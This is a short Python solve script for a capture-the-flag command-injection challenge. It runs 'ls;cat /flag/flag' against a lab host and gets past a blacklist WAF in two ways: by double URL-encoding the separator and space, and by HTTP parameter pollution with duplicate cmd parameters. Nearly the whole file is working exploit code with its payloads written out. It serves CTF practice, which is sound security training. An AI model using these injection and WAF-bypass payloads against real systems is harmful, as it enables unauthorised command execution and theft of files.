#!/usr/bin/env python3
"""
GateKeeper (inj, 200) — CWE-78 behind a blacklist WAF, bypassed two ways.

GET /run?cmd=... ; a WAF inspects cmd first. The naive `ls;cat /flag/flag` -> 403.
(a) decode-depth: WAF decodes once, app twice -> double-encode ; and space.
(b) HPP: two cmd params -> WAF reads one, app runs the other.

Usage:
    python3 solve.py                          # defaults to inj14.chal.deti:8053
    python3 solve.py http://inj14.chal.deti:8053
"""
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://inj14.chal.deti:8053"
FLAG_RE = re.compile(r"flag\{[^}]*\}")


def main() -> int:
    # door (a): double-encoded ; and space (send raw query, requests won't re-encode %25)
    a = requests.get(f"{BASE}/run?cmd=ls%253Bcat%2520/flag/flag", timeout=10).text
    m = FLAG_RE.search(a)
    if m:
        print(f"[+] door (a) double-encode -> FLAG: {m.group(0)}")
        return 0
    # door (b): HPP
    b = requests.get(f"{BASE}/run", params=[("cmd", "ls"), ("cmd", "ls;cat /flag/flag")], timeout=10).text
    m = FLAG_RE.search(b)
    print(f"[+] door (b) HPP -> FLAG: {m.group(0)}" if m else "[-] neither door returned a flag")
    return 0 if m else 1


if __name__ == "__main__":
    raise SystemExit(main())
